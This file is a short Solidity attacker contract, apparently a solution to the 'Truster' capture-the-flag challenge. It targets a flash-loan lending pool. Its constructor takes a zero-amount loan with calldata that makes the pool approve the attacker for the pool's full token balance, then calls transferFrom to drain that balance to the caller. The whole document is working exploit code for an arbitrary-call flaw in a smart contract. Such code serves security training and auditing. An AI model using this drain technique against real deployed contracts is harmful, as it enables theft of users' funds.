pragma solidity ^0.6.0;

import "./TrusterLenderPool.sol";

contract TrusterLenderPoolAttacker {

    constructor (TrusterLenderPool pool, IERC20 token) public {
        uint256 poolBalance = token.balanceOf(address(pool));

        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), poolBalance);
        
        pool.flashLoan(0, address(this), address(token), data);

        token.transferFrom(address(pool), msg.sender, poolBalance);
    }
}
